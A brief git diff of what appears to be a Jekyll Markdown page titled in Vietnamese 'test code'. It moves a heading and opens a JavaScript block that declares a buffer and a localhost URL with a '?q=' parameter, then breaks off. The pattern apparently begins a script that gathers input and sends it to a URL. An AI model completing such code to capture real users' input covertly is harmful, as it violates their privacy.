@@ -15,8 +15,9 @@ layout: single
 --- 
 
 ## Mã Kiểm Tra 
-# Javascript
 ---
+# Javascript
+
 ```js
 var buffer = [];
 var url = 'http://localhost/?q='
